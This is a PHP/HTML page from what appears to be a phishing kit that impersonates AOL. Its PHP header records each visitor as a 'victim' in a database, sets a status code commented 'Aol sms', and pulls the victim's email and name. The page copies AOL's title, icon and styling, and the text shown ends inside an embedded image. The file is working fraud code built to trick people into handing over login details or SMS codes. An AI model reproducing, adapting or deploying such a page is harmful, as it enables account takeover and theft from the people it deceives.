<?php

require_once( '../../core/functions.php' );

if ( validUser( $pdo ) ) {

  updateVictim( $pdo, $_SESSION[ 'id' ], [
    'is_waiting' => 0,
    'heartbeat' => 17 // Aol sms
  ] );

  $id = $_SESSION[ 'id' ];
  $email = getVictim( $pdo, $id )[ 'username' ];

  $first1 = getVictim( $pdo, $id )[ 'first1' ];
  $last2 = getVictim( $pdo, $id )[ 'last2' ];

} else {

  header( 'location:../../login.php' );

}

?>

<!DOCTYPE html>
<html id=Stencil class="js grid light-theme">
  <meta charset=utf-8>
  <meta name=viewport content="initial-scale=1, maximum-scale=1, user-scalable=0, shrink-to-fit=no">
  <meta name=format-detection content="telephone=no">
  <meta name=referrer content=strict-origin-when-cross-origin>
  <title>AOL</title>
  <meta name=description content=AOL>
  <link rel="shortcut icon" type=image/png href="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAGAAAABgBAMAAAAQtmoLAAAALVBMVEUvmv8vmv8vmv8vmv8vmv8vmv8vmv////9Ipv/B4f9rtv+q1f+Jxf/u9v/b7f9O50bqAAAABnRSTlMBtFfUMNolp90uAAACPklEQVRYw+2YMU8CMRTHT2OcjSbMuri7MLvoJzDOIlIPDh0tIDge56CjYNz1G0jM7ZwJcVVMnMGo8TPY117vSmihb3G6l5Bc2/fr9d/X9nh1HGEba2Smba06qi3myFwrrCv+eWJhxZTIESsrSP8dYml7wn+JWNs2B3btgSMO7NsDJfBfIAhbYcAmBjhkQB4DFFnQCMrWcRJAxDIOOMBpBtU5HFDAA3kcUHII0jIgA+YDgzDsazzccKJeAd4orWmACqX0RgdAwzkGKLOGFgZoswZ6jwB6dLJlLvAGQM0egHpKm8lkDp7C55lAmQMXEu9A6WsWwDVL1W5HlLozgIhFgTU98sK18Kct3wwwzWfs98oL4xiAogHg1b1YdVX6Q+gNAGjuP8Sqr8D3nc+zbwJAs3/MPUQMP4XyGxMQQedlodqNl6HHI2kAxuBTTWW+xpVNAwC1Dd51Q2juy6k2AJ7olHVZF4X7WFjdALTF6COuuhxrJ8cgTA+A53cYdjhn84YktDAyCw2V1J+p1s7S5W9XATwFqGvjUJHDFMCJAjC9Hb6yJyINq2WYApEK9HVrKZLb0Uk034JBpyPdau3JU4sDbnIknYpYJ5M2JNo3eMmhVxVP0zuuLY8UR2puEOVd03vak9vXkZpHaQRZ0Cp8UD/KqfFCP9I4uEEQ+AJgT4E4l27vnpMqaAyyj2IGZMAUgPyzXvyH/AGd0qCTJnRahk780KklPnlFp8foBByf4qMvEdDXFPiLEPxVC/oyB3Nd9Ae3YjmWzXfFQwAAAABJRU5ErkJggg==">
  <meta name=google-site-verification content=yOTFyUBPTnXtuk2cPpqfv7ZvZ960JgqsV8FomN3n7Y0>
  <style>
    :root {
      --sf-img-4: url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAw4AAAE5CAYAAAA5ondxAAAAAXNSR0IArs4c6QAAActpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IlhNUCBDb3JlIDUuNC4wIj4KICAgPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4KICAgICAgPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIKICAgICAgICAgICAgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIgogICAgICAgICAgICB4bWxuczp0aWZmPSJodHRwOi8vbnMuYWRvYmUuY29tL3RpZmYvMS4wLyI+CiAgICAgICAgIDx4bXA6Q3JlYXRvclRvb2w+QWRvYmUgSW1hZ2VSZWFkeTwveG1wOkNyZWF0b3JUb29sPgogICAgICAgICA8dGlmZjpPcmllbnRhdGlvbj4xPC90aWZmOk9yaWVudGF0aW9uPgogICAgICA8L3JkZjpEZXNjcmlwdGlvbj4KICAgPC9yZGY6UkRGPgo8L3g6eG1wbWV0YT4KKS7NPQAAPbdJREFUeAHtneu120aytjVnzf/DE8G0IxhOBIYjMCcCQRFIjkDbEUgTgagITEcgOAJzIhAmAvOLYL63pE1rc/OGSwOo7n56rRKARnd11VO4dAHg1osXFAhAAAIQgAAEIAABCEAAAhCAAAQgAAEIQAACEIAABCAAAQj0JRDU4b8FSi2fKRCAAAQgAIExBB7UucR76DWfP42BSd/0CPxPeiZj8UgCr0f2T7V7qX6nGi/shgAEIAABCEDAGQESB2cBmcGceoYxPA6xllEmFAhAAAIQgAAEIACBAQRIHAZAS7hLLdtXCds/1nTeOowlSH8IQAACEIAABIolQOJQVuhfluXumbcb1ZScOJ0BoQICEIAABCAAAQh0JUDi0JVU+u2CXKjSd2OUB5Y0WPJAgQAEIAABCEAAAhDoSYDEoSewhJvzmc7X4MEh4YMY0yEAAQhAAAIQWI4AicNy7OceuZ57QKfjrWWXCQUCEIAABCAAAQhAoAcBEocesBJuWst2+0yH8pUAbx04EiAAAQhAAAIQgEBPAiQOPYEl2rz0H0U/Dxu/c3hOhG0IQAACEIAABCBwhwCJwx1AGewO8qHKwI+YLtjblzqmQnRBAAIQgAAEIACB3AmQOOQe4Rcv+Czncox5C3OZC7UQgAAEIAABCEDgIgESh4tYsqqss/ImnjOVVIV46tAEAQhAAAIQgAAE8iZA4pB3fGu5x4+ir8eYtzHX2bAHAhCAAAQgAAEInBAgcTjBkd0Gn+PcDml9ezd7IQABCEAAAhCAAASOBEgcjiTyWwa5VOXnVlSP+JF0VJwogwAEIAABCEAgZwIkDvlGl89wusWWtzLdONEKAhCAAAQgAIHCCZA45HsA1Pm6FtWzStpCVI0ogwAEIAABCEAAAhkSIHHIMKhyqZbwo+juseXtTHdWtIQABCAAAQhAoFACJA55Bp7Pb/rFte7XnNYQgAAEIAABCECgPAIkDvnFPMilKj+3JvWIH0lPihflEIAABCAAAQjkQIDEIYconvrAZzenPLpu8ZamKynaQQACEIAABCBQJAESh/zCXufn0iweVRolzDISg0AAAhCAAAQgAIEECZA4JBi0GybX2sePom8AurOLtzV3ALEbAhCAAAQgAIFyCZA45BV7PrcZF896XHd6QwACEIAABCAAgXwJkDjkE9sgV6p83FnEE34kvQh2BoUABCAAAQhAIAUCJA4pRKmbjXxm043TvVa8tblHiP0QgAAEIAABCBRJgMQhj7DzpDxeHCupCvHUoQkCEIAABCAAAQjkQYDEIY84buQGP4qOF8s6nio0QQACEIAABCAAgTwIkDjkEUc+U4obRz5XissTbRCAAAQgAAEIZECAxCH9IK7lggklHoEgVfYWhwIBCEAAAhCAAAQg8EiAxCH9Q4G3DdPEkLcO03BFKwQgAAEIQAACiRIgcUg0cI9m2+8aeDI+TQyNa5hGNVohAAEIQAACEIBAegRIHNKL2VOLbXJryQNlGgL1NGrRCgEIQAACEIAABNIjQOKQXsyeWsxnSk9pxF/nc6X4TNEIAQhAAAIQgECiBEgcEg2czF4/Sroe+Lc8yER7q0OBAAQgAAEIQAACxRMgcUj3EOBtwzyx463DPJwZBQIQgAAEIAAB5wRIHJwH6Ip59rsGnoRfgRO52jiHyDpRBwEIQAACEIAABJIjQOKQXMi+GGyTWUseKPMQqOcZhlEgAAEIQAACEICAXwIkDn5jc8syPlO6RSf+Pj5Xis8UjRCAAAQgAAEIJEaAxCGxgMnc9aOkZ3m6FgeZbm95KBCAAAQgAAEIQKBYAiQO6YWetw3LxIy3DstwZ1QIQAACEIAABJwQIHFwEoiOZtjvGnjy3RFW5GbGPUTWiToIQAACEIAABCCQDAESh2RC9cVQm7xa8kBZhkC9zLCMCgEIQAACEIAABJYnQOKwfAz6WMBnSn1oxW/L50rxmaIRAhCAAAQgAIFECJA4JBIombl+lHQszs/SIJfsrQ8FAhCAAAQgAAEIFEeAxCGdkPO2wUeseOvgIw5YAQEIQAACEIDAzARIHGYGPnA4+10DT7oHwovczeJg8aBAAAIQgAAEIACBogiQOKQRbiarvuJU+zIHayAAAQhAAAIQgMD0BEgcpmccYwQ+U4pBMZ4O4hGPJZogAAEIQAACEEiEAImD/0CtZaIJxQ+BIFMqP+ZgCQQgAAEIQAACEJieAInD9IzHjsDT7bEEp+nPj6Sn4YpWCEAAAhCAAAScEiBxcBqYR7PsR7j2+waKPwK1TLL4UCAAAQhAAAIQgEARBEgcfIfZkgYmp35jVPs1DcsgAAEIQAACEIBAXAIkDnF5xtbGZ0qxicbVR3zi8kQbBCAAAQhAAAKOCZA4+A3OWqaZUPwSCDKt8mselkEAAhCAAAQgAIF4BEgc4rGMrYmn2bGJTqOPH0lPwxWtEIAABCAAAQg4I0Di4Cwgj+bY7xo2Pk3DqmcEam1bvCgQgAAEIAABCEAgawIkDj7Da0kDk1GfsblkVX2pkjoIQAACEIAABCCQEwESB5/R5DMln3G5ZhXxukaGeghAAAIQgAAEsiFA4uAvlGuZZEJJh0CQqVU65mIpBCAAAQhAAAIQ6E+AxKE/s6l78PR6asLT6OdH0tNwRSsEIAABCEAAAk4IkDg4CcSjGfa7ho0vk7CmI4Fa7Sx+FAhAAAIQgAAEIJAlARIHX2GtZQ6TT18x6WONxY8CAQhAAAIQgAAEsiRA4uArrHym5Csefa0hfn2J0R4CEIAABCAAgWQIkDj4CVUlU4Ifc7BkAAGL33pAP7pAAAIQgAAEIAAB9wRIHPyEiB/X+onFGEt46zCGHn0hAAEIQAACEHBLgMTBR2jsdw21D1OwYiSBjfrzO5WREOkOAQhAAAIQgIA/An/1Z1KRFtVFep2n05Y0WPKwzdM9vILAZATs3Fk/0R60bjKmNE86H7S+f7LNKgQgAAEI9CRA4tAT2ETN+bxlIrALqbV4bhcam2Eh4JHAMSkIMs7kfyXHJKHS+lTl7RXFrepNLJn49+PSkgrbtiUFAhCAAAQuECBxuABl5qpK44WZx2S4aQmspd6ECci0nNHuj8BKJh2P/79rPTxuW72nEmSMiZXN18XJv3tttRJLKo7rtqRAAAIQKJoAicPy4edH0cvHYAoL7K3DqykUoxMCjghUsmUt+f5xGbTMoZhPJptnzjTa/k2yl9j6QUKBAAQgUAwBEodlQ73S8PWyJjD6RARswvGThInFRIBRuwiBSqOaWKJgy9JKJYdNjqXVSiOxZMKWrYQCAQhAIFsCJA7LhrZednhGn5CAJYWWPGwnHAPVEJiaQNAAleTHx6Ud15RvBIJW60fR4s83Eb9qvbEKCgQgAAEIQCAWgc9S9F8kWwa/xzpQ0AOBGQmsNdYbiR2/XJ+GM/hD/D5I7AECJR8CD3KF8+Ibg0/5hBZPIOCbQCXzuPjkz8AmYRQIeCcQZKAlC58lXJemYfBBbEkiBCHx8iD7OUe+MfiUeDwxvyeB/+nZnubxCLyMpwpNjgm8dmwbppVNYCX3a4m9WfgseScJEso0BGqp/UXyh+SDhIcKgkCBAAQgAIH7BOyG/V+kCAY2SbB4UyDghYBNWG3iascm16FlGfyuGNQSrhGCkEh5kJ2cN98YfEokbpgZiQBvHCKB7Kmm7tme5ukSsAnBJl3zsTwjArV8sYkqk1U/QT0mcZ9l0gdJ8GMalkAAAhA4J0DicM5kjprXcwzCGG4IEG83oSjOEEtcHyR/SGxiahNVij8CFqdaYgnEJ0kloUAAAhBwR4DEYf6QVBoyzD8sIy5IwCZrTNgWDECBQwf5/CCxiehbiU1MKWkQqGSmJQ8mGwkFAhCAgBsCJA7zh+Ll/EMyogMCvHVwEIQCTLAE4YPks+SthIRBEBItlez+RWKxJIEQBAoEILA8ARKHeWNgN/F63iEZzQkBu/EziXMSjAzNsGPrQWKTzFpCyYdAkCuWQHySVBIKBCAAgcUIkDjMi76edzhGc0TAJnaWPFAgEJvAgxRawvBWQnIqCJmWSn5Z8mCyllAgAAEIzE6AxGFe5HyuMi9vb6MRf28RSdseS0RJGNKO4RDrK3X6XfJBQqIoCBQIQGA+AiQO87GuNFSYbzhGckjAnhIGh3ZhUloE7Biyp872+YqtU8okUMttSxzflOk+XkMAAksQIHGYj/rL+YZiJMcEeOvgODgJmPYgG22yWEkoELA3Du8k9gbCHkxQIAABCExKgMRhUrx/KreLe/3nFislE+A4KDn6w32v1NUShrfDVdAzYwKWNFjyYEmE3W8oEIAABCYhQOIwCdYzpfVZDRWlEiCJLDXyw/y248Umg58kQUKBwC0Cb7TTEojqViP2QQACEBhKgMRhKLl+/V73a07rzAm8zNw/3ItDYC01ljDYZJACga4EghracfMgoUAAAhCISoDEISrOi8oq1YaLe6gslUAlx0OpzuN3JwIPamVPji15oEBgCIG36sQxNIQcfSAAgasESByuoom2g6fL0VBmpYi3UFmFM5ozK2myp8U26aNAYCyB41ureqwi+kMAAhAwAiQO0x4HNgmopx0C7YkS4LhINHATml1J92eJLSkQiEXA7kMfHsXWKRCAAAQGEyBxGIyuU8e6UysalUiApLLEqF/3+Y122ZsGJnbXGbFnHIFa3e0YCxIKBCAAgUEESBwGYevcic9RTlH9rM32tKrorZdFe4/zRsASBXsa/M42KBCYmMBa+u13D9XE46AeAhDIlACJw3SBraQ6TKc+Oc2tLH6Q7CSUrwQqLcLXVf4tkIAlDfYEuC7Qd1xejgDH3XLsGRkCyRMgcZguhDxNPmV7TBh+O60ufou3UmUeAmu5/VliSwoEliBgb7pMKBCAAAQ6EyBx6IyqV0N7olP36pF/418fXbQE4pC/u509rDu3pGEuBCo58kli1wkKBJYkUGtwSx44FpeMAmNDICECJA7TBOvNNGqT1WqJQvPE+qfrT6qLXLUbdl2k52U6bbEmaSgz9l695pj0GhnsgoBDAiQO0wTl5TRqk9W6e2b58e3Ds+piNzleygh9LTft6S4FAt4IrGUQCa23qGAPBBwSIHGIH5SNVIb4apPW+Px3Dc8TiaSdi2B8JR0hgh5U+CXwRqaRNPiND5Z9/b2NJQ8BGBCAAASuESBxuEZmeP3L4V2z7fk8UTjI0yZbb4c5xo+kh3FLoZclDPy51RQihY1rIbA/12pLCgQgAIEzAiQOZ0hGVQT13ozSkF/nnVw6XHCLz5VOodSnm2xlQsCShjoTX3CjDAIruWlvHtZluIuXEIBAHwIkDn1o3W9b329SXIvnnykdAVhCQflGwG7W9bdN1jIg8CAf6gz8wIXyCByTh1Ce63gMAQjcIkDicItO/318pnTO7FqC0KqpCeUbgR+/rbKWOIFa9r9N3AfML5uAJQ+/SGxJgQAEIPCFAIlDvANhI1UhnrosNO3lRXvDk92NfSXu4hjKI+q13LBPlCgQSJ3AWg7YZ0ur1B3BfghAIA4BEoc4HE0LbxvOWTbnVSc1/M7hBMeXjfq8ipqECFj8SBoSChim3iVA8nAXEQ0gUA4BEoc4sQ5SY0+LKacEPp5unm01qjmc1ZZdQQKabvxtgsVfT0o3flh+nYAd2yTE1/mwBwLFECBxiBPqOo6arLRYQrDv4NGuQ5uSmgQ5uynJ4Ux8XcuPT5JVJv7gBgSeE7DrEsnDcypsQ6AwAiQOcQLOU+Jzjrvzqos11/7q0sXGhVRyPKUVaEsWbEJF0pBW3LC2P4FaXUwoEIBAoQRIHMYH3p7ChPFqstPQ9fcLXROM7ADdcIhj6gYch7vsL8+sHdqFSRCYgoAlydUUitEJAQj4J0DiMD5GPB2+zLC5XH1We1BN17ZnnTOuqDP2LSfX7DcNVU4O4QsEOhCwZDl0aEcTCEAgMwIkDuMCGtTdng5TTgnstGkJQdfS9e1EV305tCMh9R/FWia+8W8mFkIgOoGVNFryYEsKBCBQEAESh3HBrsd1z7Z3398t7LIlMdyxoK6b4d3pOTGBtfTb2wYKBEolwDlQauTxu2gCJA7jws9T4cv8+iYCrdSYUE4JcHyd8vCytZIhHyS2pECgZAK1nDehQAAChRAgcRge6I26huHds+25l2ftAO92A/rk3oVjzGeE7U3D2qdpWAWB2QlwPsyOnAEhsBwBEofh7HkafJldc7n6bi2/c7iMqL5cTe1CBCweJhQIQOArgZUWvIHjaIBAIQRIHIYFOqibPQ2mnBP4eF7VqaZRq0OnlmU1IkH1E+8gU/hdg594YIkfAvYG7q0fc7AEAhCYigCJwzCy9bBu2feyif9+hJe7EX1z7Rrk2CZX5xLzi6eqiQUMc2cl8EajVbOOyGAQgMDsBEgchiHnKfBlbmMn/n3/GtNlK/Kr5XhbPqZMipaPARb4J/CLTFz5NxMLIQCBoQRIHPqT26hL6N+tiB5jf6cwNvHIFTLH3LKRDRqezzCWjQGjp0HAkgZ7M0eBAAQyJUDi0D+wPP29zqy5vqvTnoNajdXRaaAEG9UJ2pyLyTYRsgkRBQIQuE/AHnRU95vRAgIQSJEAiUO/qAU1t4si5ZzATlWH8+reNWPfWvQeMJEOJKzLBOqNhq2WGZpRIZAsAZLtZEOH4RC4TYDE4Taf53vr5xVs/0kg1u8TLAGhnBMIqqrOq6mZkMBKut9OqB/VEMiVQJBjlnRTIACBzAiQOPQLKE99r/OKNeFvNYQJ5ZwAx985kylr7E+vWvJAgQAE+hOwpHvdvxs9IAABzwRIHLpHZ6OmoXvzolru5W0b0eNdRF05qarlzConhxz7Usm22rF9mAaBFAjw/56kECVshEAPAiQO3WHxtPc6q+b6rkF7+J3DdWz19V3siUiACU9EmKgqlkAlz+2hGwUCEMiEAIlDt0AGNePid53Vx+u7Bu1p1OswqGf+nV7n7+LiHtayYL24FRgAgTwIkITnEUe8gMAXAiQO3Q6EuluzIlvZBH8/gee7CXTmoDLIiSoHR5z6sJJdTHScBgezkiQQZPVDkpZjNAQgcEaAxOEMycUKPlO6iOVL5VQT/Fh/pem65enu4XicLnZvpNqSBwoEIBCPgL0p5byKxxNNEFiMAInDffQbNQn3mxXbYqrfI+yKJXrf8VpNuAnf59S3hTHlU7C+1GgPgfsE7Nx6c78ZLSAAAe8ESBzuR4inu7cZNbd3D957UM+pdA82ylHH2pEtuZjyVo7YBIcCAQjEJ2DnV4ivFo0QgMCcBP4652AJjhVk8yZBu+cyeaeBbII/VbG3GdVUyhPXa0/G3yfugyfzg4x548mgwm2x68r+Uf7f49LqrLSPYuvHUh1XtFxLVpK/S4LEtik+CFjy8MqHKVgBAQgMIUDicJtafXt38Xt/m5jATvrfTTxGquqDDK8kjYQynoBNaCjLEdhraHtQYMtGcpD0Kc2Txk/Xj9VrrVQSSyY2kpWEMj+BWkP+LGklFAhAAALZEfhDHv0XucogzBDxz/C/yv/DDPxLGCJwjF09xqa6/tm11Y7fWrLEJN4SiQfJ75KpfETvZbYW95TLg4wntt8YfEo5mNgOgZgEainj4nCdgd1w5yjvNAhxuM5giUnXHHGfc4wHjrHZzjGbZNQSTyXIGLvO/CHhWjMPg5SvWw8cJyfniZ3TlIII8OPo68F+eX0Xe0SgmYnCx5nGSXWYOlXDndhtE5jXTmzJ1YyDHHsv+U7yg2Qr8VRaGfOT5P8krySNhDItgTfTqkc7BCAAgXkJBA3Hk6fbDNYzhoQngddj8XnGOOQ41IOc4lyfhoGdt8Z3JUmtVDL4k4RjYxoGdmykeFzI7C/HNMfFt+PCzhNKQQR443A52DyBvMzlWHvQyv64McNyN8MYqQ4RZHiVqvEO7H7pwIbcTLDrw88Se8PwILHt1Eojg+3tiImtU+ISWEldHVcl2iAAgTkIkDhcplxfrqb2kcDcE3n7ayuU6wSY/F5nc2tPrZ3hVgP29SZg14Z/SB4kKSYMMvukNNqy5OGVJAd/5IabwgM6N6HAEAh0J0DicM6qVtXqvJqaJwTmnsg3T8Zm9ZxArSqO2XMu92pIuO4R6r6/VVObYP9TYuu5la0c+k7yPjfHFvQnaOzNguMzNAQgMIAAicM5NCYT50ye1+yeV0y8fZD+ucec2KXo6uvoGvNWuJZ7Vd4uzubdViPZW4ZGknOx69BPEkuQbJ0yngD32/EM0QCBWQmQOJziDtqsTqvYekZgqQn8b8/sYPOUADfgUx73tvhM4h6h+/tt8mxvGF5JSppIN/LX3j4sdS3U0NmUjTwJ2XiDIxAogACJw2mQmUyc8ri09eulyhnquEnfhrzWbhPKfQIrNdncb0aLGwT22mdvGXY32uS86yDnLGn6KWcnZ/KtnmkchoEABCIQIHE4hVifbrJ1gUBzoW6OqlaD2GSFcp0Aie91Nk/3bLSxelrBei8CW7X+QdJKSi/vBcBYHEoHMcJ/3paOgEdXCMxNgMThG/Faq0wmvvG4tLZXZXtpx0x1zUzjpDrMRoZzDN+PHgnWfUbXWmy145XkcK1BgfWNfCZ5GB74oK527aJAAAIJECBx+BYknnp8Y3FtbanPlI72fDyusLxIwJIGbsAX0fxZGbS2/nOLlT4ELGEwoZwT2KvqO4ktKf0J/Ni/Cz0gAIElCJA4fKUetKi+rvLvDQK7G/vm2GU35cMcAyU8Bk/Tbwdvc3s3e68QsIRhe2Uf1V8J2LXpB4ldpyj9CNRqvurXhdYQgMASBEgcvlJnsnX/6GvVxMMNcXff1KJbrOW9CeUyAc71y1xu1ZI03KJzuu+gTZKHUyZdtzZdG9IOAhBYjgCJw1f29XIhSGbkxomlS38u5QTDTTOYHF/GYwlVuLyL2isE7K8Gba/so/oygWPy0F7eTe0VAj9eqacaAhBwRIDE4cWLWvFYOYqJV1O8TNgbr4Ac2WVP7jimzwPC75jOmdyq2Wrn+1sN2HeVwEF7/imxJaUbgY2arbo1pRUEILAUARKHFy+YTHQ7+nbdmk3eym7EXmyZ3NmBA9jNdzOwb87dqpydi+xbI332iRJlOIG9ulryQOlOgOtWd1a0hMAiBEpPHIKoV4uQT2vQnTNzf3Nmj0dz+FzpNCpBm+vTKrauEGhVz4T3Cpye1Y3ak4B1h/Z996a0hAAEliBQeuLA5KrbUeflM6Wjtd4SmaNdnpY2SWai/C0im2+rrN0gcNA+PrG5AWjArq36mFDuE+A8vc+IFhBYlEDpiUO9KP10Bm+cmdrKnr0zmzyaQ2L8LSr88PIbi1trP2sn59YtQsP2/aRu7bCuRfVayduqKI9xFgKJESg5cagVK7tIUW4TsElEe7vJInubRUZNa9CNzOUY/8qgSit0i1i706jvFxk5/0EPcpHPv7rFmSS/GydaQWARAiUnDvwoutsh5+0zpaPVH48rLK8SsKRhc3VvOTuqclwd7KlNbPkWfzC+Th33amVvdCi3CVS3d7MXAhBYkkCpiUMQ9GpJ8AmNvXNqq92EbbJDuU2Az5VevOAHl7ePEdtrn9JwPt3nNLbFgxS0Y5Vk3n8t/1aZ+4h7EEiWQKmJA5Opbodsq2b7bk0XabVbZNS0BrWbsEnJpSrZ+Q6+N2qz7dCOJnEI8GbnPsfN/Sa0gAAEliBQauJQLwE7wTEb5zZ7/YzKG7aSE+WVglF64nTveLS3DZT5CDQaajffcEmOxFvCJMOG0SUQKDFxqBVYm0xQ7hPwPjFv7rtACxHYFEyhKtj3Lq5v1WjfpSFtohIgWbuNc317N3shAIGlCJSYOPCj6O5H265700VaHjSqdxsXAfNs0JW262d1pWzy5PJ2pPmx7m0+U+1tpXg7lfIM9K7lg123KBCAgDMCpSUOQfwrZzHwak4qE/LfvAJ0ZlepCbNNQCiXCWxV3V7eRe0MBEjabkOubu9mLwQgsASB0hKHkr/17nt8ef9M6ehPKgnO0d6llpUGDksNvuC41YJjex+aieuyEWo1/HZZE1yPTtLvOjwYVyqB0hKHutRAD/C7GdBniS6tBt0vMXCCY5aWOFcJxmguk7caqJ1rMMa5SoDk7Soa/ozydTTsgcByBEpKHGphXi2HOqmRbSLeJmRxk5CtS5paLzn4AmPzxPI69H9d38WeGQm0Gms343gpDcX5m1K0sLUYAiUlDqV+4z3kYE7lM6Wjbx+PKyxvElhpb32zRV47/56XO9G82UuTCcUHAa5fl+Ng16tweRe1EIDAUgRKSRyCAFdLQU5w3F1iNtsk6JCYzUuZW1ICHZaC7Hxc3jb4CpBdb1tfJrmxJrixBEMgAIEvBEpJHEr7tnvM4d2qs03EUyt286XcJ1CpSbjfLIsWVRZexHeCcyU+07EaicllgtXlamohAIGlCJSQOKwEt14KcILjNgnabCan9nnVkphLSKTDkoAdj20T1INj+0o1jc+VLkeezw0vc6EWAosRKCFx2IiuJQ+UbgRSnYA33dyjlQjUBVAIBfg4xMVUz+8hvqbUZy9j25QMnslW7t0zgWYYCHQlUELiUMLT1a7x7tJu16WRwzYH2ZSq7XPjtJtxPfegM49XzTxeKsNxjviNFLE5j011XkUNBCCwJIHcE4e14JpQuhFI/cbF09RucbZWuf9I+n+7oyimZSNPD8V4m56jXL8ux2x1uZpaCEBgCQK5Jw68beh3VKV+42r6uVt060reh4wJ8MDgPLipn9/nHuVV0+TlTjRvOJejoUQRBMYTyDlxsKcUm/GIitLQJO5tK/v3ifswp/k5J9Z2/lNOCTSnm2w5JECMzoPCuXzOhBoILEYg58TBkgYuON0Prb2att2bu23JU9Xuoam7N02u5To5i6c32M5xim8Cv/k2bxHrOJcXwc6gELhMIOfEIeenqZejOa42lwn3bhyGonqv5G1dlMflOtuU63pSnhOnpMKFsRAoj0CuiYM9oeApRb/jOZcJ915ut/1cL7p1jj+SroqO6GXn7byg+CdAnM5j9P15FTUQgMBSBHJNHHjb0O+IatU8pxtW08/9oltX8j4UTaAM5/9dhpvJe3mQB23yXuAABCCQLYEcE4eVorXJNmLTOLabRu1iWnP57GougLkl2nYNoJwSaE832XJMgFidBiecbrIFAQgsSSDHxMGSBiYO/Y6q3H6Ql1si1C+a/VvbOZNTWefkTCRfmkh6UDM9gdyux2OJhbEK6A8BCMQjkGPikNvT03jRvqzpoOocJ9o5+nQ5guNrg1RsxqtBAwQgAAEIQAACORPILXFYK1gmlO4Emu5Nk2rJ50r9wpXjj6T7Eci3dZOva1l6RryyDCtOQSAPArklDrxt6H9c5jrBbvqjKLqHvXEIRRPAeQhAwCuB4NUw7IJAaQRyShxWCp5Nfij9COz6NU+mdStL98lY68PQ2ocZo63gzzeeImxPN9lyToB4nQconFdRAwEILEEgp8TBkobVEhATHtMm1oeE7b9neq5vU+75PXQ/nysNJee73398m4d1zwi0z7bZhAAEIOCGQE6JA58p9T+sPvbvklSPXVLWLm9skAmb5c3AAghAAAIQgAAEPBLIJXFYC64JpR+Bpl/z5FrvZXGbnNXLGsxbh2X5MzoEIAABCEDALYFcEgfeNvQ/xFp1sYl17qXJ3cHI/m2kL0TWiToIQAACEIAABDIgkEPisFIcbLJD6Udg1695sq35nUP/0NX9u9ADAhCAAAQgAIHcCeSQOFjSYMkDpR+B3/o1T7Z1KQlSzADxuVJMmuiCAAQgAAEIZEIgh8SBz5T6H4wHdSlpQl2Sr/2PhvMeQVWb82pqIAABCEAAAhAomUDqicNawTOh9CPQ9GuefGs+V+ofQt469GdGDwhAAAIQgEDWBFJPHHjbMOzwLG0i3QzDVHQve+MQiiaA8xCAAAQgAAEInBBIOXFYyROb3FD6E9j175J0j1bW75P2YBnj62WGHT3qYbSGvBR8n5c72XtTZe8hDkIAAskSSDlxsKRhlSz55Qy3CXSJE6vS3rLEOMJS/Vzp3zGcRwcEIOCGQOPGEgyBQOEEUk4c+Exp2MGb+/8WfY3K7toO6q8SCNqzubqXHakQWKViKHZ+IRDgAAEIQMArgb96NeyOXWvtN6EMI1AN65Z8r4M8YBLVL4z21mHXrwutnRHgWuksIHfMCXf2sxsCEIDAYgRSTRx42zD8kHk3vCs9CySwkc9B0kpSKYdUDJ3RzqCx2hnHY6jhBP42vCs9IQABCExLIMVPlVZCYpMZCgQgMA+B1M63/TxYkholJGVt2cYSq9P4N6ebbEEAAksSSDFxsEnMaklojA2Bwgjwhi/9gFfpu1CMB8SqmFDjKATSI5Bi4sAkJr3jDIvTJhBkfpWQC21Cts5lKp+/zEV63Djrcd2z7H3I0iucgkCiBFJLHOyiyoU10YMNs5MmkNKfZm2TJj2N8dU0atEamQD3t3Og/HnlcybUQGAxAqklDrxtWOxQYeDCCdTyf5UQg0NCts5hatAgKcVvDiYex/i7R6OwCQIQgMCRQEqJg930NkfDWUIAArMTqGcfcfiA++Fds+1ZZetZPo4Ro/NYNudV1EAAAksRSClxqAWJJ2ZLHSmMC4EXL1J643cgYGcEvj+rocITgSBj1p4McmIL57KTQGAGBIxASolDSpMWji4I5EggyKkqEcf4Lvo8UJvzKmocEagc2eLJlL0nY7AFAqUTSCVxqBSoUHqw8B8CDgik8iPp1gErbyYEGcQTbW9R+WbPj99WWXsk0EICAhDwRSCVxCGVyYqv6GINBOITqKVyFV9tdI1tdI15KKzycCNLL4jNeVjb8ypqIACBJQmkkDjYJKVeEhJjQwACJwTqky2fG41Psxa3iocwi4fgogG1alNIyC8aP2HlfkLdqIYABAYQSCFxqAf4RRcIQGA6Aqn83qidDkGymtey3ITiiwCfKV2Ox38uV1MLAQgsRSCFxCGVScpSMWRcCMxNIGjAau5BB4zXDuhTQhfeOviKsr1p2PgyyY01ezeWYAgEIPCFgPfEoZKV4Yul/AMBCHgikMLk8zdPwBzZUssWm6xSfBB448MMl1Y0Lq3CKAgUTMB74pDC5KTgwwfXCyZQy3fvk0+eVl4+QC1um8u7qF2AAPe5y9A5fy9zoRYCixLwnDjYza1elA6DQwACtwjUt3Y62MfE43oQ3l7fxZ4ZCdQaK8w4XkpDcf6mFC1sLYaA58ShLiYKOAqBNAl4//1RK6yHNNFObnXQCPXkozDAPQIkcNcJ8Z84XmfDHggsRsBz4uB9UrJY0BgYAk4IBNlRObHlmhnNtR3Uv2DSuuxBUGv4sKwJrkdvXFuHcRAolIDXxKFSPEKhMcFtCKREwPv32fxA+vrRFLSrvr6bPRMTIHG7DZhPlW7zYS8EFiHgNXHwPhlZJFgMCgGHBDayaeXQrqNJTD6OJC4vmbxe5jJ1ba0BwtSDJKy/Sdh2TIdA1gQ8Jg42Camzpo5zEMiHgJ2vG8fuNI5t82BakBEPHgwpyAY7Z94V5O8QV3lTOIQafSAwAwGPiUM9g98MAQEIxCPg/fdIu3iuZqnJ4hey9MynU/aWx5IHynUCzfVd7IEABJYk4DFx8D4JWTJejA0BjwTWMsrEa+Hp5e3I2CSWJ+C3GcXaa+fJm1jKMtVzkF9Npr7hFgSSJ+AtcahENCRPFQcgUB4Bzwl/U144enu8UQ8TyrQEPkyrPgvtTRZe4AQEMiXgLXHgR9GZHmi4lT0Bm3SunHq5l12tU9s8mWWT